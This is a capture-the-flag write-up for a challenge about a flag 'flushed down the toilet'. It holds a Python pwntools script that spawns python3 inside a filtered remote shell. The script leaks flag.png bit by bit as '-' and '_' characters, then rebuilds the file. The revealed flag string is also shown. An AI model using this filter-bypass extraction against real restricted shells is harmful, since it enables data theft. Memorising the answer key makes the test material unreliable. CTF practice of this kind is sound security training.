#### Challenge:

Oh no, our flag got flushed down the toilet <i>again</i>! <br><br> <b>Open the <code>Deployment</code> tab to start this challenge.</b>

---

#### Solution:

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'
r = remote('challenge.ctf.games', 30877)

CMD='''with open('flag.png', mode='rb') as f:
    c = f.read(1)
    while c != b"":
        for i in range(8):
            print('-' if bin(int.from_bytes(c, byteorder='little'))[2:].zfill(8)[i] == '0' else '_')
        c = f.read(1)

print('e')
'''

def rcv():
    return r.recvline().decode('utf-8')

def rcvu(msg):
    return r.recvuntil(msg).decode('utf-8')

rcvu('   "mm ')
rcv()
r.sendline('/usr/bin/python3')
rcvu(' mm#mm  "#m#"  #   #    # ')
rcv()
for l in CMD.splitlines():
    r.sendline(l)
r.sendline()

flag_raw=[]
l = rcv()
while l.strip() != '"      "      "             "#mm"':
    if l.strip():
        flag_raw.append(l.strip())
    l = rcv()

flag_bin = []
for l in flag_raw:
    if l == '"""':
        flag_bin.append('0')
    elif l == '""""""':
        flag_bin.append('1')

flag_binary="".join(flag_bin)

flag_bytes = [flag_binary[i:i + 8] for i in range(0, len(flag_binary), 8)]
with open('flag.png', 'wb') as f:
    f.write(bytearray([int(b, 2) for b in flag_bytes]))
```

---

<details><summary>FLAG:</summary>

```
flag{flushed_down_the_toilet_but_rescued_again}
```

</details>
<br/>
